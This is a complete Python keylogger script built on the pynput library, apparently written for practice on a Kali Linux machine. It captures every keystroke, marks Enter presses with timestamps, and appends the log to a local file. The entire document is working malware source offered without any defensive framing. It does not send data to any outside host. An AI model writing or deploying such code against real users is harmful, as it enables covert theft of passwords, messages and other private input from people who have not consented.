from pynput import keyboard
from datetime import datetime
import os

# Defines log path
log_path = '/home/kali/log.txt'

# Initializes array
array = []

def on_press(key):
	# Set the array variable to global to access it from the whole script
	global array
	# If key pressed is an alfnum char append it
	try:
		array.append('{0}'.format(key.char))

	# If it's special char (space, enter, backspace...) we have to manage it...
	except AttributeError:
		# If it's enter we insert the enter key indicator, a line break and a timestamp on new line
		if key == keyboard.Key.enter:
			timestamp = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
			array.append('[Key.enter]\n[{0}]'.format(timestamp))
		# If it's space we append a space '
		elif key == keyboard.Key.space:
			array.append(' ')
		# Else we just append the key indicator
		else:
			array.append('[{0}]'.format(key))

	# Opens file to write
	with open(log_path, 'a') as archivo:
		# Casting the array type to string before writting
		archivo.write(''.join(array))
		# Resetting the array after writing its content to the file
		array = []

with keyboard.Listener(on_press=on_press) as listener:
	# Checks if file exists
	if not os.path.exists(log_path):
		with open(log_path, 'w') as log:
			log.write('[INICIO]\n')

	# Start the listener
	listener.join()
